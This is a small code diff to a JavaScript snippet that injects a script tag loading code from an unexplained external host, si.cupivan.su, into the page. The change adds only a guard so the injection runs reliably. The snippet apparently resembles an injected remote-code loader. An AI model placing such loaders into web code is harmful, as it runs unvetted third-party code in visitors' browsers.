@@ -17,4 +17,5 @@
 
 var s = document.createElement('script');
 s.src = 'http://si.cupivan.su/beta/script-dev.js';
+if (document.body)
 document.body.appendChild(s);
